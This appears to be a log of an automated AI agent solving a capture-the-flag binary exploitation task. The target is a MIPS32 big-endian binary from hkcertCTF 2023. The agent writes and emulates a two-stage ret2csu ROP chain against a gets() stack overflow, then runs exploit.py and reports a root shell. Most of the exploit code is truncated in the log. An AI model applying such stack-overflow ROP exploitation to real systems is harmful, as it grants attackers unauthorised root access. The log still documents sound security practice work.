13:59:58 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nDetailed analysis of the ROP chain with proper gp handling.\n\nAfter main epilogue:\n  sp = sp_orig + 0x6)
13:59:58 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/two_stage_analysis.py
13:59:58 [exploit] → 调用 GLM...
14:00:00 [exploit] ← GLM(2.4s): 调工具[run_script]
14:00:00 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/two_stage_analysis.py", "timeout": 15})
14:00:01 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] '/work/workspace/0024-2023-51-mips-rop-20260909-134236/target' ⏎     Arch:       mips-32-big ⏎     RELRO:    ...(3245 chars)
14:00:01 [exploit] → 调用 GLM...
14:01:07 [exploit] ← GLM(66.3s): 调工具[write_file]
14:01:07 [exploit] 分析完成！但有个问题：`_init` 函数使用 `$t9` 来计算 gp（`addu $gp, $gp, $t9`），而 `$t9` 在调用 `_init` 之前被设为 `*(gp - 0x7f4c)`。让我检查这个值是否有效。  `*(0x492364) = 0x64024000` — 这个值看起
14:01:07 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nVerify two-stage ROP chain with Unicorn, including the _init call.\nIf _init crashes, we need an alternat)
14:01:07 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py
14:01:07 [exploit] → 调用 GLM...
14:01:09 [exploit] ← GLM(1.7s): 调工具[run_script]
14:01:09 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "timeout": 30})
14:01:09 [exploit]   ← run_script(0.1s): rc=1 ⏎ --- stdout (summarized) --- ⏎ (empty) ⏎ --- stderr (summarized) --- ⏎ Traceback (most recent call last): ⏎   File "/work/workspace/0024-2023-51...(462 chars)
14:01:09 [exploit] → 调用 GLM...
14:01:13 [exploit] ← GLM(4.7s): 调工具[edit_file]
14:01:13 [exploit] ELF 解析有问题。MIPS BE 的 ELF 头可能需要大端读取。让我修复。
14:01:14 [exploit]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "new_string": "# Parse ELF header (MIPS BE = big-endian ELF)
14:01:14 [exploit]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py'
14:01:14 [exploit] → 调用 GLM...
14:01:20 [exploit] ← GLM(6.6s): 调工具[edit_file]
14:01:20 [exploit]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "new_string": "    p_type = st.unpack_from('>I', data, off))
14:01:20 [exploit]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py'
14:01:20 [exploit] → 调用 GLM...
14:01:23 [exploit] ← GLM(2.3s): 调工具[run_script]
14:01:23 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "timeout": 30})
14:01:23 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ LOAD: vaddr=0x400000, offset=0x0, filesz=0x7dd84, memsz=0x7dd84, flags=5 ⏎ LOAD: vaddr=0x48e867, offset=0x7e867, ...(2497 chars)
14:01:23 [exploit] → 调用 GLM...
14:01:38 [exploit] ← GLM(15.1s): 调工具[edit_file]
14:01:38 [exploit] 问题：Unicorn 在 `syscall` 指令后崩溃（`jr $ra` at 0x41f348）。这是因为 Unicorn 不自动处理 MIPS syscall 指令——它触发了一个异常。我需要在 hook 中模拟 syscall 的返回行为。  但更重要的是：**第一个 syscall (re
14:01:38 [exploit]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "new_string": "        if insn.mnemonic == 'syscall':\n    )
14:01:38 [exploit]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py'
14:01:38 [exploit] → 调用 GLM...
14:02:13 [exploit] ← GLM(35.1s): 调工具[write_file]
14:02:13 [exploit] Unicorn 的 hook 在 syscall 指令时设置 PC 跳过它，但 Unicorn 仍然会在 syscall 指令上抛出异常。让我用 `UC_HOOK_INTR` 来处理 syscall 异常，而不是在 code hook 中。
14:02:13 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nVerify two-stage ROP chain with Unicorn.\nHandle syscall instruction via UC_HOOK_INTR.\n\"\"\"\nimport st)
14:02:13 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py
14:02:13 [exploit] → 调用 GLM...
14:02:17 [exploit] ← GLM(4.3s): 调工具[run_script]
14:02:17 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_two_stage.py", "timeout": 30})
14:02:17 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === Starting two-stage ROP emulation === ⏎   sp = 0x7f0ff000, ra = 0x4010c4, gp = 0x49a2b0 ⏎   [  1] 0x004010c4: ...(3171 chars)
14:02:17 [exploit] → 调用 GLM...
14:03:38 [exploit] ← GLM(80.8s): 调工具[write_file]
14:03:38 [exploit] **两阶段 ROP 链完全验证成功！**  Unicorn 模拟显示： 1. **Stage 1:** `read(0, 0x492790, 8)` — 从 stdin 读取 "/bin/sh\x00" 到 .bss ✓ 2. `_init` 被调用但成功返回（gp 被正确恢复）✓ 3. **Sta
14:03:38 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit: MIPS32 BE Stack Overflow → ret2csu ROP Chain → execve(\"/bin/sh\", NULL, NULL)\n\nTarget: hkc)
14:03:38 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py
14:03:38 [exploit] → 调用 GLM...
14:03:41 [exploit] ← GLM(2.5s): 调工具[run_script]
14:03:41 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "timeout": 30})
14:03:47 [exploit]   ← run_script(6.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [*] Response: b'\nLEANAGENT_SUCCESS\n' ⏎ [*] Shell output: b'uid=0(root) gid=0(root) group...(1160 chars)
14:03:47 [exploit] → 调用 GLM...
14:03:57 [exploit] ← GLM(10.0s): 调工具[execute]
14:03:57 [exploit] **EXPLOIT 成功！** 🎉  证据： 1. **Shell 获取成功：** `uid=0(root) gid=0(root) groups=0(root)` — 获得了 root shell 2. **命令执行成功：** `echo LEANAGENT_SUCCESS` → 输出 `LEAN
14:03:57 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0024-2023-51-mips-rop-20260909-134236/check_env.py /work/workspace/0024-2023-51-mips-rop-20260909-134236/find_gadge)
14:03:57 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
14:03:57 [exploit] → 调用 GLM...
14:04:00 [exploit] ← GLM(2.7s): 调工具[read_file]
14:04:00 [exploit] 现在让我读取最终的 exploit.py 内容用于报告。
14:04:00 [exploit]   → 工具 read_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py"})
14:04:00 [exploit]   ← read_file(0.0s):   1  #!/usr/bin/env python3 ⏎   2  """ ⏎   3  S4 Exploit: MIPS32 BE Stack Overflow → ret2csu ROP Chain → execve("/bin/sh", NULL, NULL) ⏎   4   ⏎   5  ...(4856 chars)
14:04:00 [exploit] → 调用 GLM...
14:05:05 [exploit] ← GLM(65.4s): 调工具[submit_final_result]
14:05:05 [exploit] 好的，exploit.py 内容已确认。现在提交最终结果。
14:05:05 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，12110 chars）
14:05:05 [exploit] → 调用 GLM...
14:05:13 [exploit] ← GLM(8.3s)
14:05:13 [exploit] Exploit 已成功提交。总结：  ## S4 Exploit 完成总结  **目标：** hkcertCTF 2023 MIPS32 big-endian 静态链接二进制  **漏洞：** gets() 无界栈缓冲区溢出（76 字节到 saved ra）  **利用路线：** ret2csu 两
14:05:13 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
14:05:13 [stage4] 保存 → /work/workspace/0024-2023-51-mips-rop-20260909-134236/stage4.json
14:05:28 📄 渗透报告：/work/workspace/0024-2023-51-mips-rop-20260909-134236/report.md
=== 主 agent 汇总 ===
## 分析完成 ✅

对 `./target` 的完整 S1-S4 漏洞分析已成功跑完，结果如下：

| 项目 | 结果 |
|------|------|
| **Exploit 是否成功** | ✅ 成功 |
| **二进制路径** | `/work/workspace/0024-2023-51-mips-rop-20260909-134236/target` |
| **Exploit 脚本** | `/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py` |
| **完整报告** | `/work/workspace/0024-2023-51-mips-rop-20260909-134236/report.md` |
| **工作目录** | `/work/workspace/0024-2023-51-mips-rop-20260909-134236/` |

从工作目录命名来看，这是一个 **MIPS 架构的 ROP 漏洞**（`mips-rop`）。分析流程完成了：
- **S1 侦察**：识别二进制架构、保护机制等
- **S2 语义**：定位漏洞点并分析其语义
- **S3 原语验证**：验证可利用的原语
- **S4 Exploit**：成功生成并验证了 exploit

如需查看详细报告内容或 exploit 脚本，我可以帮你读取 `report.md` 或 `exploit.py`。
